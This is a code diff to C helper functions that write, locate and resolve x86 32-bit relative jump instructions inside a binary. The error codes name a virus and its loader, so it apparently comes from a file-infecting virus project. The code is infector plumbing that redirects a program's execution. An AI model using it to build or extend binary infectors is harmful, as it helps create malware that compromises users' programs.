@@ -5,30 +5,35 @@
 #include "errors.h"
 #include "jumps.h"
 
-void	write_jump_arg(void *arg, int32_t value, uint8_t value_size)
+bool	write_jump32(struct safe_ptr ref, size_t offset, int32_t value)
 {
-	if (value_size == DWORD)     *(int32_t*)arg = (int32_t)(value);
-	else if (value_size == WORD) *(int16_t*)arg = (int16_t)(value);
-	else if (value_size == BYTE) *(int8_t*)arg  = (int8_t)(value);
+	uint8_t	*jump_opcode = safe(ref, offset, JUMP32_INST_SIZE);
+	int32_t	*jump_value = (int32_t*)(jump_opcode + 1);
+
+	if (jump_opcode == NULL)
+		return errors(ERR_VIRUS, _ERR_V_CANT_READ_JUMP);
+
+	*jump_opcode = 0xe9;
+	*jump_value  = value;
+
+	return true;
 }
 
-void	write_jump(void *buffer, int32_t value, uint8_t value_size)
+bool	write_jump32_value(struct safe_ptr ref, size_t offset, int32_t value)
 {
-	uint8_t	*opcode = (uint8_t*)(buffer);
-	int32_t	*arg    = (int32_t*)(buffer + 1);
+	void	*jump_value = safe(ref, offset, DWORD);
 
-	*opcode = 0xe9; // rel16/32
-	write_jump_arg(arg, value, value_size);
+	if (jump_value == NULL)
+		return errors(ERR_VIRUS, _ERR_V_CANT_READ_JUMP);
+
+	*(int32_t*)(jump_value) = value;
+
+	return true;
 }
 
-bool	is_jump32(const uint8_t *code)
+void	*find_first_jump32(struct safe_ptr ref, size_t offset)
 {
-	return (*code == 0xe9);
-}
-
-void	*find_first_jump(struct safe_ptr ref, size_t offset)
-{
-	void	*code  = safe(ref, offset, INSTRUCTION_MAXLEN);
+	void	*code = safe(ref, offset, INSTRUCTION_MAXLEN);
 
 	while (true)
 	{
@@ -36,22 +41,23 @@ void	*find_first_jump(struct safe_ptr ref, size_t offset)
 			return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);
 
 		if (!known_instruction(code, INSTRUCTION_MAXLEN))
-			return errors(ERR_THROW, _ERR_T_FIND_FIRST_JUMP);
+			return errors(ERR_THROW, _ERR_T_FIND_FIRST_JUMP32);
 
-		size_t	instruction_length = disasm_length(code, INSTRUCTION_MAXLEN);
-		if (instruction_length == 0)
-			return errors(ERR_THROW, _ERR_T_FIND_FIRST_JUMP);
-
-		if (is_jump32(code))
+		if (is_jump32(*(uint8_t*)(code)))
 			return code;
 
-		code = step_instruction(ref, code, instruction_length);
+		code = step_instruction(code, INSTRUCTION_MAXLEN);
 	}
 }
 
-void	*get_jump_destination(void *jump_ptr)
+void	*get_jump32_destination(struct safe_ptr ref, size_t offset)
 {
-	int32_t	*jump_value = (int32_t*)(jump_ptr + 1);
+	void	*jump = safe(ref, offset, JUMP32_INST_SIZE);
 
-	return ((jump_ptr + JUMP32_INST_SIZE) + *jump_value);
+	if (jump == NULL)
+		return errors(ERR_VIRUS, _ERR_V_CANT_READ_JUMP);
+
+	int32_t	*jump_value = (int32_t*)(jump + 1);
+
+	return ((jump + JUMP32_INST_SIZE) + *jump_value);
 }
